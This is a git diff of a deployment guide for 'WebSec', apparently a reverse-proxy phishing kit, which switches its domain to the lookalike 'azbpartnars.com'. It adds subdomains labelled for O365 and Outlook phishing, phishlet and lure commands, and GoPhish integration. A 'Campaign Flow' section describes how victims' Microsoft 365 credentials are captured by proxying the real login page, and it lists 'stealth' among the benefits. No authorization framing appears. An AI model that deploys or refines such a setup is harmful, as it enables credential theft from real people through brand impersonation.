@@ -9,11 +9,24 @@ This guide will help you deploy WebSec on AWS EC2 with Cloudflare integration fo
 ## 📋 Prerequisites
 
 - AWS EC2 instance (Ubuntu 22.04 LTS recommended)
-- Domain name: `azbpartner.com`
+- Domain name: `azbpartnars.com`
 - Cloudflare account
+- GoPhish already deployed on separate server
 - Basic knowledge of Linux command line
 
 ## 🏗️ Infrastructure Setup
+
+### Multi-Server Architecture
+
+**Current Setup:**
+- **GoPhish Server:** Already deployed and working
+  - Landing Page: `www.azbpartnars.com`
+  - Admin Panel: `panel.azbpartnars.com:3333`
+- **WebSec Server:** This deployment (43.205.114.81)
+  - O365 Phishing: `login.azbpartnars.com`
+  - Outlook Phishing: `mail.azbpartnars.com`
+  - Generic Phishing: `secure.azbpartnars.com`
+  - Auth Phishing: `auth.azbpartnars.com`
 
 ### AWS EC2 Instance Configuration
 
@@ -33,15 +46,24 @@ Inbound Rules:
 
 ### Cloudflare Configuration
 
+**Current Setup:**
+- GoPhish Landing Page: `www.azbpartnars.com` → [GoPhish Server IP]
+- GoPhish Admin Panel: `panel.azbpartnars.com:3333` → [GoPhish Server IP]
+
+**WebSec DNS Records to Add:**
 1. **Add Domain to Cloudflare:**
-   - Add `azbpartner.com` to your Cloudflare account
-   - Set DNS A record: `azbpartner.com` → `43.205.114.81`
-   - Enable Cloudflare Proxy (orange cloud)
+   - Add `azbpartnars.com` to your Cloudflare account (if not already added)
+   - Set DNS A records for WebSec subdomains:
+     - `login.azbpartnars.com` → `43.205.114.81`
+     - `mail.azbpartnars.com` → `43.205.114.81`
+     - `secure.azbpartnars.com` → `43.205.114.81`
+     - `auth.azbpartnars.com` → `43.205.114.81`
+   - Enable Cloudflare Proxy (orange cloud) for all subdomains
 
 2. **SSL/TLS Settings:**
    - Mode: Full (strict)
    - Edge Certificates: Always Use HTTPS
-   - Origin Certificates: Create and install
+   - Origin Certificates: Create and install for each subdomain
 
 ## 🔧 Server Setup
 
@@ -100,16 +122,25 @@ sudo chown -R $USER:$USER ~/.websec
 ### Option 1: Cloudflare Origin Certificate (Recommended)
 
 ```bash
-# Create certificate directory
-mkdir -p ~/.websec/crt/sites/azbpartner.com
+# Create certificate directories for each subdomain
+mkdir -p ~/.websec/crt/sites/login.azbpartnars.com
+mkdir -p ~/.websec/crt/sites/mail.azbpartnars.com
+mkdir -p ~/.websec/crt/sites/secure.azbpartnars.com
+mkdir -p ~/.websec/crt/sites/auth.azbpartnars.com
 
-# Download Cloudflare Origin Certificate from Cloudflare dashboard
-# Save as: ~/.websec/crt/sites/azbpartner.com/fullchain.pem
-# Save key as: ~/.websec/crt/sites/azbpartner.com/privkey.pem
+# Download Cloudflare Origin Certificates from Cloudflare dashboard for each subdomain
+# Save as: ~/.websec/crt/sites/[subdomain]/fullchain.pem
+# Save key as: ~/.websec/crt/sites/[subdomain]/privkey.pem
 
-# Set proper permissions
-chmod 600 ~/.websec/crt/sites/azbpartner.com/privkey.pem
-chmod 644 ~/.websec/crt/sites/azbpartner.com/fullchain.pem
+# Set proper permissions for each subdomain
+chmod 600 ~/.websec/crt/sites/login.azbpartnars.com/privkey.pem
+chmod 644 ~/.websec/crt/sites/login.azbpartnars.com/fullchain.pem
+chmod 600 ~/.websec/crt/sites/mail.azbpartnars.com/privkey.pem
+chmod 644 ~/.websec/crt/sites/mail.azbpartnars.com/fullchain.pem
+chmod 600 ~/.websec/crt/sites/secure.azbpartnars.com/privkey.pem
+chmod 644 ~/.websec/crt/sites/secure.azbpartnars.com/fullchain.pem
+chmod 600 ~/.websec/crt/sites/auth.azbpartnars.com/privkey.pem
+chmod 644 ~/.websec/crt/sites/auth.azbpartnars.com/fullchain.pem
 ```
 
 ### Option 2: Let's Encrypt (Automatic)
@@ -135,7 +166,7 @@ In the WebSec terminal:
 
 ```bash
 # Set domain
-config domain azbpartner.com
+config domain azbpartnars.com
 
 # Set IP and port
 config ip 0.0.0.0
@@ -146,6 +177,11 @@ config autocert off
 
 # Set blacklist mode
 config blacklist off
+
+# Configure GoPhish integration (optional)
+config gophish admin_url https://panel.azbpartnars.com:3333
+config gophish api_key [your-gophish-api-key]
+config gophish test
 
 # Exit developer mode
 exit
@@ -217,13 +253,31 @@ sudo apt install unattended-upgrades -y
 sudo dpkg-reconfigure unattended-upgrades
 ```
 
+## 🔄 Campaign Flow
+
+### How the Multi-Server Setup Works:
+
+1. **Email Campaign:** Victim receives phishing email
+2. **WebSec Interception:** Victim clicks link → `login.azbpartnars.com`
+3. **Credential Capture:** WebSec proxies to real O365, captures credentials
+4. **Redirect to GoPhish:** After capture, redirect to `www.azbpartnars.com/landing-page`
+5. **Campaign Tracking:** GoPhish tracks completion and provides analytics
+
+### Benefits:
+- **Domain Consistency:** All phishing uses `azbpartnars.com`
+- **Separation of Concerns:** GoPhish for campaigns, WebSec for credential capture
+- **Stealth:** No obvious connection between servers
+- **Scalability:** Easy to add more phishing subdomains
+
 ## 🧪 Testing Your Deployment
 
 ### 1. Basic Connectivity Test
 
 ```bash
-# Test if WebSec is running
-curl -k https://azbpartner.com
+# Test if WebSec is running on subdomains
+curl -k https://login.azbpartnars.com
+curl -k https://mail.azbpartnars.com
+curl -k https://secure.azbpartnars.com
 
 # Check service status
 sudo systemctl status websec
@@ -232,7 +286,7 @@ sudo systemctl status websec
 sudo journalctl -u websec -f
 ```
 
-### 2. Configure a Phishlet
+### 2. Configure Phishlets for Subdomains
 
 ```bash
 # Connect to WebSec
@@ -240,10 +294,24 @@ cd /opt/websec
 ./websec -p ~/.websec/phishlets -t ~/.websec/redirectors
 
 # In WebSec terminal:
-phishlets hostname o365 azbpartner.com
+# Configure O365 phishlet
+phishlets hostname o365 login.azbpartnars.com
 phishlets enable o365
+
+# Configure Outlook phishlet
+phishlets hostname outlook mail.azbpartnars.com
+phishlets enable outlook
+
+# Configure generic phishlet
+phishlets hostname generic secure.azbpartnars.com
+phishlets enable generic
+
+# Create lures for testing
 lures create o365
 lures get-url 0
+
+# Test GoPhish integration
+config gophish test
 ```
 
 ## 📊 Monitoring and Maintenance
@@ -310,21 +378,34 @@ sudo netstat -tlnp | grep :443
 
 **2. SSL Certificate issues:**
 ```bash
-# Check certificate files
-ls -la ~/.websec/crt/sites/azbpartner.com/
+# Check certificate files for each subdomain
+ls -la ~/.websec/crt/sites/login.azbpartnars.com/
+ls -la ~/.websec/crt/sites/mail.azbpartnars.com/
+ls -la ~/.websec/crt/sites/secure.azbpartnars.com/
 
-# Verify certificate
-openssl x509 -in ~/.websec/crt/sites/azbpartner.com/fullchain.pem -text -noout
+# Verify certificates
+openssl x509 -in ~/.websec/crt/sites/login.azbpartnars.com/fullchain.pem -text -noout
+openssl x509 -in ~/.websec/crt/sites/mail.azbpartnars.com/fullchain.pem -text -noout
 ```
 
 **3. Domain not resolving:**
 ```bash
-# Check DNS
-nslookup azbpartner.com
-dig azbpartner.com
+# Check DNS for subdomains
+nslookup login.azbpartnars.com
+nslookup mail.azbpartnars.com
+nslookup secure.azbpartnars.com
 
 # Check Cloudflare settings
-# Ensure A record points to 43.205.114.81
+# Ensure A records point to 43.205.114.81
+```
+
+**4. GoPhish integration issues:**
+```bash
+# Test GoPhish connection
+config gophish test
+
+# Check GoPhish admin panel
+curl -k https://panel.azbpartnars.com:3333
 ```
 
 ### Useful Commands
@@ -336,8 +417,9 @@ sudo netstat -tlnp | grep websec
 # Check process
 ps aux | grep websec
 
-# Test SSL
-openssl s_client -connect azbpartner.com:443 -servername azbpartner.com
+# Test SSL for subdomains
+openssl s_client -connect login.azbpartnars.com:443 -servername login.azbpartnars.com
+openssl s_client -connect mail.azbpartnars.com:443 -servername mail.azbpartnars.com
 ```
 
 ## 📁 Directory Structure
@@ -349,9 +431,19 @@ openssl s_client -connect azbpartner.com:443 -servername azbpartner.com
 └── redirectors/                # HTML redirector templates
 
 ~/.websec/                      # Configuration directory
-├── crt/sites/azbpartner.com/   # SSL certificates
-│   ├── fullchain.pem          # Public certificate
-│   └── privkey.pem            # Private key
+├── crt/sites/                  # SSL certificates
+│   ├── login.azbpartnars.com/  # O365 certificates
+│   │   ├── fullchain.pem      # Public certificate
+│   │   └── privkey.pem        # Private key
+│   ├── mail.azbpartnars.com/   # Outlook certificates
+│   │   ├── fullchain.pem      # Public certificate
+│   │   └── privkey.pem        # Private key
+│   ├── secure.azbpartnars.com/ # Generic certificates
+│   │   ├── fullchain.pem      # Public certificate
+│   │   └── privkey.pem        # Private key
+│   └── auth.azbpartnars.com/   # Auth certificates
+│       ├── fullchain.pem      # Public certificate
+│       └── privkey.pem        # Private key
 ├── phishlets/                  # Active phishlets
 └── redirectors/                # Active redirectors
 ```
@@ -384,8 +476,9 @@ For issues and questions:
 - [ ] AWS EC2 instance launched with proper security groups
 - [ ] Go installed and working
 - [ ] WebSec built successfully
-- [ ] Domain `azbpartner.com` configured in Cloudflare
-- [ ] DNS A record pointing to `43.205.114.81`
+- [ ] Domain `azbpartnars.com` configured in Cloudflare
+- [ ] DNS A records for subdomains pointing to `43.205.114.81`
+- [ ] GoPhish integration configured (optional)
 - [ ] SSL certificates configured
 - [ ] Systemd service created and running
 - [ ] Firewall configured
